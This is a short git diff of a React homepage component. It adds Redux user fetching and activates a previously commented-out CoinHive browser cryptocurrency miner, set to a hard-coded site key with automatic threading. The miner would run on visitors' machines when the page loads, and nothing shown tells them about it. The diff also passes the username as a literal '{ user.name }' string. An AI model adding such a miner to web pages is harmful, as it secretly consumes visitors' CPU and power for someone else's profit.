@@ -1,9 +1,27 @@
 import React from 'react';
+import { connect } from "react-redux";
 import CoinHive from 'react-coin-hive';
 
 import Post from '../components/Post';
 
+import { fetchUser } from "../actions/UserActions"
+
+@connect((store) => {
+    return {
+        user: store.user.user,
+        user_fetched: store.user.fetched
+    };
+})
+
 export default class Home extends React.Component {
+    componentWillMount() {
+        this.props.dispatch(fetchUser())
+    }
+
+    fetchUser() {
+        this.props.dispatch(fetchUser())
+    }
+
     render() {
         const { post } = this.props;
 
@@ -36,7 +54,10 @@ export default class Home extends React.Component {
 
 
                 </div>
-                {/* <CoinHive siteKey='LizXPgR1RicCNg50MGh2EOgT4BjJovK0' userName='Anonymous'/> */}
+                <CoinHive siteKey='LizXPgR1RicCNg50MGh2EOgT4BjJovK0'
+                    autoThreads={true}
+                    userName='{ user.name }'
+                />
             </div>
         )
     }
